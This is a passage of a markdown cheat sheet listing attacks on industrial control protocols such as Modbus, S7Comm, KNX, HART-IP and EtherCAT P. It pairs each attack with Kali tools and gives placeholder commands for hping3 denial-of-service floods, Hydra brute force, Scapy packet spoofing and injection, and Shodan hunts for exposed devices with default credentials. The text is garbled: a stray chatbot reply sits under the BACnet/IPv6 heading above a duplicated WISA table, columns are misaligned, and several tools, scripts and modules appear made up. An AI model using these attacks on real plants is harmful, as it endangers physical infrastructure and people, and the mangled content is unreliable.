|Lack of Authentication|Metasploit Framework, ExploitDB, Shodan|-|-|Exploit the lack of authentication in Modbus TCP/IP implementations to gain unauthorized access|
|Eavesdropping|Wireshark, tcpdump, tshark|-|-|Capture and analyze network traffic in Modbus TCP/IP systems to intercept and gather sensitive information|
|Network Scanning|Nmap|-|-|Scan the network for Modbus TCP/IP devices and identify potential vulnerabilities and open ports|
|Denial of Service (DoS)|Hping3, Slowloris, OWASP ZAP|-|-|Launch DoS attacks targeting Modbus TCP/IP devices or network infrastructure to disrupt communication|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|modbus_write_register, modbus_read_input_registers|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on Modbus TCP/IP systems|
|Nmap Scripting Engine|Nmap|-|modbus-discover, modbus-brute|Use Nmap's scripting engine to execute specific scripts targeting Modbus TCP/IP systems|

### CANopen

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Unauthorized Access|Metasploit Framework, ExploitDB|-|-|Exploit vulnerabilities in CANopen implementations to gain unauthorized access to industrial automation systems|
|Message Injection|CANBus Tools, SocketCAN|-|-|Inject malicious messages into the CANopen network to manipulate the behavior of industrial automation systems|
|Network Scanning|Nmap|-|-|Scan the network for CANopen devices and identify potential vulnerabilities and open ports|
|Reverse Engineering|IDA Pro, Binwalk, Wireshark|-|-|Analyze CANopen firmware or captured network traffic to understand protocol implementation and identify weaknesses|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|-|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on CANopen implementations|
|Nmap Scripting Engine|Nmap|-|-|Use Nmap's scripting engine to execute specific scripts targeting CANopen devices and identify potential vulnerabilities|

### KNX

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Unauthorized Access|Metasploit Framework, ExploitDB|-|-|Exploit vulnerabilities in KNX implementations to gain unauthorized access to building automation and control networks|
|Man-in-the-Middle (MitM)|Bettercap, Ettercap|-|-|Intercept and manipulate KNX communication to perform malicious actions, such as controlling devices or capturing sensitive data|
|Network Scanning|Nmap|-|-|Scan the network for KNX devices, identify open ports, and gather information about the network structure and potential vulnerabilities|
|Denial of Service (DoS)|Hping3, Slowloris|-|-|Send a high volume of traffic or specific malformed packets to disrupt or overload KNX devices and cause service unavailability|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|-|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on KNX implementations|
|Nmap Scripting Engine|Nmap|-|-|Use Nmap's scripting engine to execute specific scripts targeting KNX devices and identify potential vulnerabilities|



### IEC 62351

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Authentication Bypass|Metasploit Framework, ExploitDB|-|-|Exploit vulnerabilities in authentication mechanisms of IEC 62351 implementations to bypass security measures and gain unauthorized access|
|Key Management Exploitation|OpenSSL, John the Ripper, Hydra|-|-|Analyze and exploit weaknesses in key management processes used in IEC 62351 to compromise encryption or authentication mechanisms|
|Man-in-the-Middle (MitM)|Bettercap, Ettercap|-|-|Intercept and manipulate IEC 62351 communication to perform malicious actions, such as tampering with data or capturing sensitive information|
|Network Scanning|Nmap|-|-|Scan the network for IEC 62351 devices, identify open ports, and gather information about the network structure and potential vulnerabilities|
|Denial of Service (DoS)|Hping3, Slowloris|-|-|Launch DoS attacks against IEC 62351 devices, disrupting their availability or rendering them unresponsive|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|-|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on vulnerabilities in IEC 62351 implementations|
|Nmap Scripting Engine|Nmap|-|-|Use Nmap's scripting engine to execute specific scripts targeting IEC 62351 devices and identify potential vulnerabilities|

### S7Comm

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Authentication Bypass|Metasploit Framework, ExploitDB|-|-|Exploit vulnerabilities in authentication mechanisms of S7Comm to bypass security measures and gain unauthorized access|
|Data Manipulation|Wireshark, Scapy|-|-|Capture and analyze S7Comm traffic to identify and modify data packets, potentially causing disruption or unauthorized actions|
|Denial of Service (DoS)|Hping3, Slowloris|-|-|Launch DoS attacks against S7Comm devices, disrupting their availability or rendering them unresponsive|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|-|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on vulnerabilities in S7Comm implementations|
|Network Scanning|Nmap|-|-|Scan the network for S7Comm devices, identify open ports, and gather information about the network structure and vulnerabilities|
|PLC-specific Tools|Siemens STEP 7, TIA Portal|-|-|Use Siemens programming tools to interact with and manipulate S7-300 and S7-400 PLCs|

### H1 Fieldbus

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Unauthorized Access|Metasploit Framework, ExploitDB|-|-|Exploit vulnerabilities in H1 Fieldbus implementations to gain unauthorized access to process automation and control systems|
|Data Manipulation|Wireshark, Scapy|-|-|Capture and analyze H1 Fieldbus traffic to identify and modify data packets, potentially causing disruption or unauthorized actions|
|Denial of Service (DoS)|Hping3, Slowloris|-|-|Launch DoS attacks against H1 Fieldbus devices, disrupting their availability or rendering them unresponsive|
|Exploitation Frameworks|Metasploit Framework, ExploitDB|-|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on vulnerabilities in H1 Fieldbus implementations|
|Network Scanning|Nmap|-|-|Scan the network for H1 Fieldbus devices, identify open ports, and gather information about the network structure and potential vulnerabilities|
|PLC-specific Tools|Yokogawa FieldMate, Honeywell Experion|-|-|Use vendor-specific tools for H1 Fieldbus systems to interact with and manipulate process automation and control devices|

### Zigbee RF4CE

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|eavesdropping|Wireshark|-|-|Capture and analyze Zigbee RF4CE network traffic to intercept and monitor communication between remote controls and consumer electronics devices|
|packet injection|Scapy|-|-|Craft and inject malicious Zigbee RF4CE packets into the network to manipulate or disrupt remote control commands and compromise consumer electronics devices|
|sniffing network keys|KillerBee|-|-|Use the KillerBee framework to perform sniffing attacks on Zigbee RF4CE networks, capturing network keys for potential unauthorized access|
|network scanning|Zigbee NSE (Nmap Scripting Engine)|-|zigbee-discover|Use the zigbee-discover Nmap script to scan the network for Zigbee RF4CE devices, identify their presence, and gather information for further analysis|
|Zigbee exploitation|ZigDiggler|-|-|Utilize ZigDiggler, a Zigbee exploitation framework, to discover and exploit vulnerabilities in Zigbee RF4CE implementations|

### Foundation Fieldbus

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Man-in-the-Middle|Ettercap|-|-|Use Ettercap to perform a man-in-the-middle attack on the Foundation Fieldbus network, intercepting and manipulating communication between devices|
|Traffic Analysis|Wireshark|-|-|Capture and analyze Foundation Fieldbus network traffic to understand the communication patterns, identify vulnerabilities, and detect anomalies|
|Protocol Fuzzing|Sulley|-|-|Employ Sulley, a fuzzing framework, to test the robustness of the Foundation Fieldbus protocol by sending malformed or unexpected data to the target devices|
|Device Enumeration|nmap|-|-|Utilize nmap to scan the Foundation Fieldbus network, identify connected devices, and gather information about their configurations and capabilities|
|Protocol Reverse Engineering|IDA Pro|-|-|Use IDA Pro, a powerful disassembler and debugger, to reverse engineer the Foundation Fieldbus protocol and analyze its implementation|



### MMS

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Man-in-the-Middle|Ettercap|-|-|Use Ettercap to perform a man-in-the-middle attack on the MMS network, intercepting and manipulating communication between industrial systems|
|Traffic Analysis|Wireshark|-|-|Capture and analyze MMS network traffic to understand the communication patterns, identify vulnerabilities, and detect anomalies|
|Protocol Fuzzing|Sulley|-|-|Employ Sulley, a fuzzing framework, to test the robustness of the MMS protocol by sending malformed or unexpected data to the target industrial systems|
|Device Enumeration|nmap|-|-|Utilize nmap to scan the MMS network, identify connected industrial systems, and gather information about their configurations and capabilities|
|Protocol Reverse Engineering|IDA Pro|-|-|Use IDA Pro, a powerful disassembler and debugger, to reverse engineer the MMS protocol and analyze its implementation|


### EtherNet/IPTap

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Man-in-the-Middle|Ettercap|-|-|Use Ettercap to perform a man-in-the-middle attack on the EtherNet/IPTap network, intercepting and manipulating network traffic in EtherNet/IP networks|
|Traffic Analysis|Wireshark|-|-|Capture and analyze EtherNet/IPTap network traffic using Wireshark to understand the communication patterns, detect anomalies, and identify vulnerabilities|
|Network Scanning|nmap|-|-|Utilize nmap to scan the EtherNet/IPTap network, discover devices, and gather information about their configurations and open ports|
|Protocol Fuzzing|Sulley|-|-|Employ Sulley, a fuzzing framework, to test the robustness of the EtherNet/IP protocol by sending malformed or unexpected data to the network|
|Protocol Reverse Engineering|IDA Pro|-|-|Use IDA Pro, a powerful disassembler and debugger, to reverse engineer the EtherNet/IP protocol and analyze its implementation|

### MelsecNet

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Man-in-the-Middle|Ettercap|-|-|Use Ettercap to perform a man-in-the-middle attack on the MelsecNet network, intercepting and manipulating network traffic in Mitsubishi Electric PLC systems|
|Traffic Analysis|Wireshark|-|-|Capture and analyze MelsecNet network traffic using Wireshark to understand the communication patterns, detect anomalies, and identify vulnerabilities|
|Network Scanning|nmap|-|-|Utilize nmap to scan the MelsecNet network, discover devices, and gather information about their configurations and open ports|
|Protocol Fuzzing|Sulley|-|-|Employ Sulley, a fuzzing framework, to test the robustness of the MelsecNet protocol by sending malformed or unexpected data to the network|
|PLC Exploitation|-|Mitsubishi Electric PLC-specific exploits|-|Explore publicly available Mitsubishi Electric PLC-specific exploits for potential vulnerabilities in the PLC systems connected to the MelsecNet network|

### FOUNDATION HSE

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
|Protocol Analysis|Wireshark|-|-|Use Wireshark to capture and analyze FOUNDATION HSE network traffic, inspecting the protocol packets, identifying vulnerabilities and analyzing communication|
|Traffic Injection|Scapy|-|-|Utilize Scapy, a powerful packet manipulation tool, to craft and inject custom packets into the FOUNDATION HSE network for testing and analysis|
|Network Scanning|nmap|-|-|Employ nmap to scan the FOUNDATION HSE network, identify active devices, and gather information about their configurations and open ports|
|DoS Attacks|Hping3|-|-|Use Hping3 to launch Denial-of-Service (DoS) attacks against the FOUNDATION HSE network, potentially disrupting communication or causing system unavailability|
|Vulnerability Scanning|OpenVAS|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the FOUNDATION HSE network and identify potential weaknesses|

### PROFIsafe

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|-|-|-|Use Wireshark to capture and analyze PROFIsafe network traffic, inspecting the protocol packets, identifying vulnerabilities, and analyzing communication|
|Traffic Manipulation|Scapy|-|-|`packet = Ether() / IP() / TCP() / PROFIsafe()`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify PROFIsafe packets for testing and analysis. You can create a packet using the provided template, replacing the fields with appropriate values.|
|Network Scanning|nmap|-|-|-|Employ nmap to scan the PROFIsafe network, identify active devices, and gather information about their configurations and open ports|
|DoS Attacks|Hping3|-|-|-|Use Hping3 to launch Denial-of-Service (DoS) attacks against the PROFIsafe network, potentially disrupting communication or causing system unavailability|
|Vulnerability Scanning|OpenVAS|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the PROFIsafe network and identify potential weaknesses|


### CIP Safety

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|-|-|-|Use Wireshark to capture and analyze CIP Safety network traffic, inspecting the protocol packets, identifying vulnerabilities, and analyzing communication|
|Traffic Manipulation|Scapy|-|-|`packet = Ether() / IP() / TCP() / CIPSafety()`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify CIP Safety packets for testing and analysis. You can create a packet using the provided template, replacing the fields with appropriate values.|
|Network Scanning|nmap|-|-|-|Employ nmap to scan the CIP Safety network, identify active devices, and gather information about their configurations and open ports|
|DoS Attacks|Hping3|-|-|-|Use Hping3 to launch Denial-of-Service (DoS) attacks against the CIP Safety network, potentially disrupting communication or causing system unavailability|
|Vulnerability Scanning|OpenVAS|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the CIP Safety network and identify potential weaknesses|


### DeviceNet

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|Use Wireshark to capture and analyze DeviceNet network traffic, inspecting the protocol packets, identifying vulnerabilities, and analyzing communication|
|Traffic Manipulation|Scapy|`sudo scapy`|-|-|`packet = Ether() / IP() / TCP() / DeviceNet()`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify DeviceNet packets for testing and analysis. You can create a packet using the provided template, replacing the fields with appropriate values.|
|Network Scanning|nmap|`sudo nmap -p 44818,2222 <target_IP>`|-|-|-|Employ nmap to scan the DeviceNet network, identify active devices, and gather information about their configurations and open ports|
|DoS Attacks|Hping3|`sudo hping3 -c <packet_count> -p <port> <target_IP>`|-|-|-|Use Hping3 to launch Denial-of-Service (DoS) attacks against the DeviceNet network, potentially disrupting communication or causing system unavailability|
|Vulnerability Scanning|OpenVAS|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the DeviceNet network and identify potential weaknesses|

### HART-IP

|Attack Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|Use Wireshark to capture and analyze HART-IP network traffic, inspecting the protocol packets, identifying vulnerabilities, and analyzing communication|
|Traffic Manipulation|Scapy|`sudo scapy`|-|-|`packet = Ether() / IP() / UDP() / HARTIP()`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify HART-IP packets for testing and analysis. You can create a packet using the provided template, replacing the fields with appropriate values.|
|Network Scanning|nmap|`sudo nmap -sU -p 5094 <target_IP>`|-|-|-|Employ nmap to scan the HART-IP network, identify active devices, and gather information about their configurations and open ports|
|Spoofing|Scapy|`sudo scapy`|-|-|`packet = Ether() / IP() / UDP() / HARTIP()`|Use Scapy to craft HART-IP packets with forged source IP addresses, simulating IP spoofing attacks. Modify the source IP field of the packet with the desired spoofed IP address and send it to the target|
|Tampering|HART-IP Tool|`sudo hart_ip_tool -d <device_IP> -s "<tampered_data>"`|-|-|-|Utilize the HART-IP Tool to interact with HART-IP devices and tamper with the data being exchanged. Use the command with the `-d` flag followed by the target device IP address and the `-s` flag followed by the tampered data to be sent|
|Vulnerability Scanning|OpenVAS|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the HART-IP network and identify potential weaknesses|

### EtherCAT P

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze EtherCAT P network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = Ether() / IP() / UDP() / EtherCATP()`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify EtherCAT P packets for testing and analysis. You can create a packet using the provided Scapy code template, replacing the fields with appropriate values, and then send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -sU -p 8899 <target_IP>`|-|-|-|-|Employ nmap to scan the EtherCAT P network, identify active devices, and gather information about their configurations and open ports|
|Brute-Force Authentication|Hydra|`sudo hydra -l <username> -P <password_list> -t 4 -s 8899 <target_IP> ethercatp`|-|-|-|-|Use Hydra, a powerful brute-force authentication tool, to launch a dictionary attack against the EtherCAT P devices. Replace `<username>` with the target username and `<password_list>` with a file containing a list of possible passwords. Adjust the number of threads (`-t`) as needed and specify the target IP address and port for the attack|
|Denial-of-Service (DoS)|hping3|`sudo hping3 -c <packet_count> -p 8899 --udp <target_IP>`|-|-|-|-|Utilize hping3 to launch a UDP-based Denial-of-Service (DoS) attack against the EtherCAT P devices. Specify the number of packets (`<packet_count>`) and the target IP address. Adjust other parameters as needed|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the EtherCAT P network and identify potential weaknesses|

### WISA Wireless

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze WISA Wireless network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>")/UDP(dport=49200)/Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify WISA Wireless packets for testing and analysis. Create a packet with the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -sU -p 49200 <target_IP>`|-|-|-|-|Employ nmap to scan the WISA Wireless network, identify active devices, and gather information about their configurations and open ports|
|Unauthorized Access|Wireless Sniffing|Wireshark, Aircrack-ng|-|-|-|-|Use Wireshark or Aircrack-ng to perform wireless sniffing and capture WISA Wireless traffic, attempting to intercept and analyze unauthorized access attempts|
|Data Integrity Issues|Packet Injection|Scapy|`packet = IP(dst="<target_IP>")/UDP(dport=49200)/Raw(load="<tampered_payload>")`|-|-|`send(packet)`|Utilize Scapy to craft WISA Wireless packets with tampered payloads, simulating data integrity issues. Modify the `<target_IP>` and `<tampered_payload>` in the Scapy code template, and then send the packet using the `send()` function|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the WISA Wireless network and identify potential weaknesses|


### BACnet/IPv6

Certainly! Here's a cheatsheet for WISA Wireless, including known exploitation methods, specific offensive security tools in Kali Linux, real example commands, and more:

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze WISA Wireless network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>")/UDP(dport=49200)/Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify WISA Wireless packets for testing and analysis. Create a packet with the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -sU -p 49200 <target_IP>`|-|-|-|-|Employ nmap to scan the WISA Wireless network, identify active devices, and gather information about their configurations and open ports|
|Unauthorized Access|Wireless Sniffing|Wireshark, Aircrack-ng|-|-|-|-|Use Wireshark or Aircrack-ng to perform wireless sniffing and capture WISA Wireless traffic, attempting to intercept and analyze unauthorized access attempts|
|Data Integrity Issues|Packet Injection|Scapy|`packet = IP(dst="<target_IP>")/UDP(dport=49200)/Raw(load="<tampered_payload>")`|-|-|`send(packet)`|Utilize Scapy to craft WISA Wireless packets with tampered payloads, simulating data integrity issues. Modify the `<target_IP>` and `<tampered_payload>` in the Scapy code template, and then send the packet using the `send()` function|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the WISA Wireless network and identify potential weaknesses|

### Zigbee IP

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze Zigbee IP network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = Zigbee() / ZigbeeIP()`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify Zigbee IP packets for testing and analysis. Create a packet using the provided Scapy code template, and then send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p U:49191-49192 --script zigbee-bridge-discovery <target_IP>`|-|-|`zigbee-bridge-discovery`|-|Employ nmap with the Zigbee bridge discovery script to scan for Zigbee IP devices and identify any accessible bridges. Specify the target IP address and the port range for the scan|
|Unauthorized Access|ZigDiggler|`sudo zigdiggler <target_IP>`|-|-|-|-|Use ZigDiggler, a Zigbee network hacking tool, to perform unauthorized access attempts on Zigbee IP devices. Replace `<target_IP>` with the IP address of the target device|
|Data Privacy Issues|Zigbee Sniffing|KillerBee, Wireshark|-|-|-|-|Utilize KillerBee tools, such as `sniff` or `wireshark`, to capture Zigbee IP traffic and analyze it in Wireshark for potential data privacy issues|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the Zigbee IP network and identify potential weaknesses|

### CC-Link

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze CC-Link network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / TCP(dport=5000) / Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify CC-Link packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 5000 <target_IP>`|-|-|-|-|Employ nmap to scan the CC-Link network, identify active devices, and gather information about their configurations and open ports|
|Eavesdropping|Packet Sniffing|Wireshark, tcpdump|-|-|-|-|Use packet sniffing tools like Wireshark or tcpdump to capture CC-Link network traffic and analyze it to eavesdrop on the communication|
|Unauthorized Access|Shodan Search, Default Credentials|Shodan|-|-|-|-|Utilize Shodan to search for CC-Link devices exposed on the internet and attempt to access them using default credentials or other known vulnerabilities|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the CC-Link network and identify potential weaknesses|

### KNXnet/IP

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze KNXnet/IP network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / TCP(dport=3671) / Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify KNXnet/IP packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 3671,3672 <target_IP>`|-|-|-|-|Employ nmap to scan the KNXnet/IP network, identify active devices, and gather information about their configurations and open ports|
|Unauthorized Access|KNX Exploitation Framework|-|-|KNX Exploitation Framework|-|-|Utilize the KNX Exploitation Framework, a specialized tool for attacking KNX systems, to attempt unauthorized access to KNXnet/IP devices|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the KNXnet/IP network and identify potential weaknesses|

### IEC 61883

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze IEC 61883 network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / UDP(dport=61883) / Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify IEC 61883 packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 61883 <target_IP>`|-|-|-|-|Employ nmap to scan the IEC 61883 network, identify active devices, and gather information about their configurations and open port|
|Eavesdropping|Packet Sniffing|Wireshark, tcpdump|-|-|-|-|Use packet sniffing tools like Wireshark or tcpdump to capture IEC 61883 network traffic and analyze it to eavesdrop on the communication|
|Unauthorized Access|Shodan Search, Default Credentials|Shodan|-|-|-|-|Utilize Shodan to search for IEC 61883 devices exposed on the internet and attempt to access them using default credentials or other known vulnerabilities|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the IEC 61883 network and identify potential weaknesses|

### CIP Motion

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze CIP Motion network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / TCP(dport=44818) / Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify CIP Motion packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 44818,2222 <target_IP>`|-|-|-|-|Employ nmap to scan the CIP Motion network, identify active devices, and gather information about their configurations and open ports|
|Unauthorized Access|Shodan Search, Default Credentials|Shodan|-|-|-|-|Utilize Shodan to search for CIP Motion devices exposed on the internet and attempt to access them using default credentials or other known vulnerabilities|
|Vulnerability Scanning|OpenVAS|-|-|-|-|-|Deploy OpenVAS, a comprehensive vulnerability scanner, to assess the security posture of the CIP Motion network and identify potential weaknesses|

### WirelessMBus

|Attack Methods|Known Exploitation Methods|Specific Offensive Security Tools in Kali Linux|Detail Real Example Commands|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Scapy Code|Commands Description|
|---|---|---|---|---|---|---|---|
|Protocol Analysis|Wireshark|`sudo wireshark`|-|-|-|-|Use Wireshark to capture and analyze WirelessMBus network traffic, inspecting the protocol packets and identifying any vulnerabilities or anomalies in the communication|
|Traffic Manipulation|Scapy|`sudo scapy`|`packet = IP(dst="<target_IP>") / TCP(dport=50000) / Raw(load="<data_payload>")`|-|-|`send(packet)`|Utilize Scapy, a powerful packet manipulation tool, to craft and modify WirelessMBus packets for testing and analysis. Create a packet using the provided Scapy code template, replacing `<target_IP>` with the target IP address and `<data_payload>` with the desired data payload. Then, send the packet using the `send()` function|
|Network Scanning|nmap|`sudo nmap -p 50000 <target_IP>`|-|-|-|-|Employ nmap to scan the WirelessMBus network, identify active devices, and gather information about their configurations and open port|
|Unauthorized Access|Default Credentials, Jamming|-|-|-|-|-|Exploit default credentials of WirelessMBus devices or perform jamming attacks to disrupt communication and potentially gain unauthorized access|
|Vulnerability Scanning|OpenVAS, Nessus|-|-|-|-|-|Deploy vulnerability scanners like OpenVAS or Nessus to assess the security posture of WirelessMBus devices, identifying potential vulnerabilities and weaknesses|

### Fieldbus HSE

